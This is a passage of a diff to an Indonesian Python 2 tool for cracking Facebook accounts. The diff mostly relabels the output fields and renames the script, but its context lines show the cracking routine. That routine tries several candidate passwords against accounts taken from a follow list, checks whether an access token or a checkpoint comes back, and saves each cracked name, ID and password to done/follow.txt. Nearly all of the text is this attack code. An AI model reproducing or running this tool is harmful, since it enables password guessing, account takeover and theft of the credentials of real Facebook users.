+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos1
                 cek = open('done/follow.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
@@ -1681,20 +1681,20 @@ def crack_follow():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/follow.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos2
                     cek = open('done/follow.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -1703,20 +1703,20 @@ def crack_follow():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/follow.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos3
                         cek = open('done/follow.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -1725,20 +1725,20 @@ def crack_follow():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/follow.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos4
                             cek = open('done/follow.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -1747,20 +1747,20 @@ def crack_follow():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/follow.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos5
                                 cek = open('done/follow.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
                             else:
@@ -1769,20 +1769,20 @@ def crack_follow():
                                 ko = json.load(data)
                                 if 'access_token' in ko:
                                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos6
                                     oke = open('done/follow.txt', 'a')
-                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
                                     print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos6
                                     cek = open('done/follow.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
                                     cekpoint.append(zowe)
         except:
@@ -1796,7 +1796,7 @@ def crack_follow():
     print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/follow.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;95mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def user_id():
@@ -1819,7 +1819,7 @@ def perbarui():
     jalan('\x1b[1;92mMemperbarui Script ...\x1b[1;93m')
     os.system('git pull origin master')
     raw_input('\n\x1b[1;94m{\x1b[1;97m<Kembali>\x1b[1;94m}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 if __name__ == '__main__':
